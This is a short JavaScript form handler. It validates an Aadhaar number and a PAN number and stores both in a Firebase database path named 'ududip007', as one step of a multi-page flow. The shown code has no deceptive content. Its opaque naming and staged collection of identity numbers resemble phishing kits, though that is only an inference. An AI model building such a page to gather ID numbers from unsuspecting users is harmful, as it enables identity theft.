// Firebase initialized here 
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var aadhaar = document.getElementById("a1").value.trim();
  var pan = document.getElementById("b2").value.trim();

  if (!aadhaar || !/^\d{12}$/.test(aadhaar)) {
    alert("Please enter a valid 12-digit Aadhaar number.");
    return;
  }

  if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan.toUpperCase())) {
    alert("Please enter a valid PAN number.");
    return;
  }

  var key = localStorage.getItem("firebaseKey");

  if (!key) {
    alert("Previous data missing. Please start from Step 1.");
    window.location.href = "index.html";
    return;
  }

  ududip007DB.child(key).update({
    haadhaar_number: aadhaar,
    ipan_number: pan
  }).then(() => {
    localStorage.removeItem("firebaseKey"); // ✅ Cleanup
    window.location.href = "4.html"; // Final success page
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
